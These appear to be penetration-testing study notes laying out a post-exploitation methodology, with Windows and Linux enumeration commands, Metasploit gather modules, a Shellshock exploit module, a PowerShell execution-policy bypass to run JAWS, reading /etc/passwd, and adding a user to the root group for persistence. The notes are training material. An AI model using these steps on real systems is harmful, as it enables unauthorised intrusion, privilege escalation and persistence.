# Post Exploit Methodology
1. Local enum
2. Transfer files
3. Upgrading shells
4. Priv esc
5. Persistence
6. Dumping/cracking hashes (NTLM/unshadowed pwd)
7. Pivoting
8. Clearing Tracks
-> process repeats until whole network compromised

Note:
2 & 3 optional


# Windows Local Enum
- system info Eg
	- Hostname -> useful for user enum (sometimes named as user)
	- OS name/build/servicepack/architecture -> useful for priv esc
	- Installed updates
Demo:
`getuid`
`sysinfo`
`cd C:\\Windows\System32 && cat eula.txt` 
-> does not exist on every version of windows but gives info on build etc

On shell
`hostname`
`systeminfo` -->  gives info for hotfixes/patches
`wmic qfe get Caption,Description,HotFixID,Installation`
-> info about each specific hotfix (concerned with Security Update)

##### User and groups Enum

getuid
getprivs

/windows/gather/enum_logged_on_users

shell
`whoami`
`whoami /priv`
`query user` -> see if any other users logged on

`net users` -> all users on the system
`net user <username>` -> info about a user

`net users localgroup` -> groups on the system

`net localgroup <groupname>`  -> members in a group eg administrator

##### Enumerate network info
- internal network for pivoting
- firewall state for backdoor etc

shell
`ipconfig`
`ipconfig /all` -> see if DHCP enabled meaning the ip could change

`route print` -> list out the route table

`arp -a` 
-> arp table list other devices on the network
-> many with 225 and static are related to the subnet mask, not interesting

`netstat -ano`
-> display list of open ports/services running

`netsh firewall show state`
or
`netsh advfirewall firewall show allprofiles`
-> find if a specific port is blocked etc

#### Enum process and services
- process is a instance of running exe
- service is a process running in background (ie daemon on linux)

Demo:
In meterpreter sess
`ps`
`pgrep explorer.exe` -> usually most stable
`migrate <pid>` 
-> take note of privs for each process
-> architecture of ps can be diff too

shell
`net start`
-> list of **services** started (running in bg)
`wmic service list brief`
-> list services diff format
`tasklist /SVC`
-> list processes and associated services
-> lookout for lsass.exe and svchost.exe

`schtasks /query /fo LIST`
`schtasks /query /fo LIST v`
->list scheduled tassk and services also verbose
-> look for scheduled task run as NT/Authority system etc that are misconfiged

#### Automate windows local enum
- JAWS powershell script

Demo:
WinRM running on -p5985
/winrm/winrm_script_exec

meterpreter
`show_mount`
-> see if there are xternal harddrives etc on the target sys

/gather/win_privs
/windows/gather/enum_logged_on_users
/gather/checkvm  -> check if in a vm
/gatehr/enum/applications

/gather/enum_computers
-> find other systems connected to the network (pivoting etc)

/gather/enum_patches

/gather/enum_shares

#### JAWS
goto github copy raw and paste locally notepad etc

sidenote: to paste into lab env ctrl+shift+alt

Meterpreter
mkdir TEMP
cd TEMP
upload /root/Desktop/jaws-enum.ps1

shell
`powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
-> enumerate all the info and ouput into a txt file
-> takes very long just wait
`download JAWS-enum.txt`


# Linux Local Enum
- defualt package manager is aptitude package manager (apt)
- Get the exact distribution (for PE)
- kernel version (kernel exploit)
- architecture (what kind of payload can exec)

Interactive session
`/bin/bash -i`

sessions -u 1

Most is same as windows (sysinfo etc)

shell
`/bin/bash -i`
`hostname` -> could give info on usernames
`cat /etc/issue` -> issue version
`cat /etc/*release`  -> release version (also shows issue)
`uname -a` ->kernel versions
`env` -> env variables for the root user (eg PATH, PWD=/root)
`lscpu` -> hardware info

`free -h` 
-> the memory info (if the tool is installed)

`df -h`
`df -ht ext4`
`lsblk | grep sd`
--> hardrive info

`dpkg -l`
-> list installed packages see if vuln versions used (esp bash for PE)

### User group info
`getuid`
-> note uid number 0 is root and so on so forth

`groups root`
-> group a user (eg root) is in

`cat /etc/passwd`
-> user and service accts listed
-> to distinguish, 
see the dir configured for the 
user acct : /bin/bash or /bin/sh
service accts: /usr/sbin/nologin
--> the service accts is not set up to allow users to log into it / only used to manage a service (eg www-data for apache webserver)
-> sometimes even /bin/sync or /bin/false are service accts

Easy trick for only user accts(exclude nologin) :
`cat /etc/passwd | grep -v /nologin`

`root:x:0:0:root:/root:/bin/bash`
`<username> :x:< userid> : <grpid> :root: <homedir> : <shell>`

`ls /home` should ahve the other user accts

Add user
`useradd -m bob -s /bin/bash`
`ls -al /home` -> bob shud be added to the home dir

See groups
`groups`
`usermod -aG root bob` -> add bob to root group

`last` -> see last user logged on (only legitimate logons tru ssh or physical TTY session)
`lastlog` -> list all users prev logged on

#### Enum linux network info

`ifconfig`
interface1 lo loopback interface 127.0.0.1 for local services 
....etc etc
interface 6180 eth0 -> the interface connected to our subnet

`netstat`
-> services running and ports

`route` 
-> route table
-> look for the gateway (could be router or some DHCP server etc)

/bin/bash -i
`ip a s`  -> use if ifcofig not available for that distrib
`cat /etc/networks`
`cat /etc/hostname`
`cat /etc/hosts` -> find new subdomains etc
`cat /etc/resolv.conf` -> checks the dns server used

In meterpreter (if arp not available in bash)
`arp`


#### Enum ps and cronjobs
`ps`
`pgrep <ps name>`
`ps aux`
`top` -> util that lists al running processes 

`crontab -l`
-> list of cronjobs
`ls -al /etc/cron*`
`cat /etc/cron*`

#### Automate local enum

Demo:
vuln
/http/apache_mod_cgi_bash_env_exec
set RPATH /gettime.cgi  --> found from the source code

/gather/enum_configs
set session, run
`cat <loot dir>`
`loot`

/gather/enum_network
/gather/enum_system
/gather/checkvm

script LinEnum can be used
- upload onto the system 
- chmod +x linenum.sh
- ./linenum.sh
Similar to linpeas but less for priv esc